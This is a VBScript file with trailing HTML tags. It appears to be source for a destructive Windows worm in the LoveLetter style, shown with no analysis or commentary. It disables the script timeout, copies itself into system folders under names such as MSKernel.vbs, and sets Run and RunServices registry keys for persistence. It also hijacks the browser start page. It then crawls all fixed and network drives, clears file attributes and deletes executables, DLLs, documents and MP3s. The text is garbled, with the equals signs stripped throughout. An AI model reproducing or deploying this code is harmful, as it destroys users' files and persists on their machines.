on error resume next
dim fso,dirwin,dirsystem
set fsoCreateObject("Scripting.FileSystemObject")
main()
sub main()
on error resume next
set timeoverCreateObject("WScript.Shell")
rrtimeover.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Setting\Timeout")
if (rr>1) then
timeover.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Setting\Timeout",0,"REG_DWORD"
end if
Set dirwinfso.GetSpecialFolder(0)
Set dirsystemfso.GetSpecialFolder(1)
Set cfso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel.vbs")
c.Copy(dirwin&"\Win32Dll.vbs")
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32Dll",dirwin&"\Win32Dll.vbs"
timeover.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32Dll",dirwin&"\Win32Dll.vbs"
timeover.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.hziee.edu.cn"
listdriv()
end sub
sub listdriv()
on error resume next
Dim d,dc
Set dcfso.Drives
For Each d in dc
if d.DriveType2 or d.Drivetype3then
folderlist(d.path&"\")
end if
next
end sub
sub infectfiles(folderspec)
on error resume next
dim f,f1,fc,ext
set ffso.GetFolder(folderspec)
set fcf.Files
for each f1 in fc
extfso.GetExtensionName(f1.path)
extlcase(ext)
if (ext"exe")or(ext"dll")or(ext"dat") or (ext"mp3") or (ext"doc") or (ext"mp3") then
set attfso.getfile(f1.path)
if(att.attributes1)or(att.attributes3)or(att.attributes5)or(att.attributes7)or(att.attributes33)or(att.attributes35)or(att.attributes37)or(att.attributes39) then
att.attributesatt.attributes-1
end if
if(att.attributes4)or(att.attributes5)or(att.attributes6)or(att.attributes7)or(att.attributes36)or(att.attributes38)then
att.attributesatt.attributes-4
end if
fso.deletefile(f1.path)
end if
next
end sub
sub folderlist(folderspec)
on error resume next
dim f,f1,sf
set ffso.GetFolder(folderspec)
set sff.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub


--1

------------
</XMP></BODY></HTML>

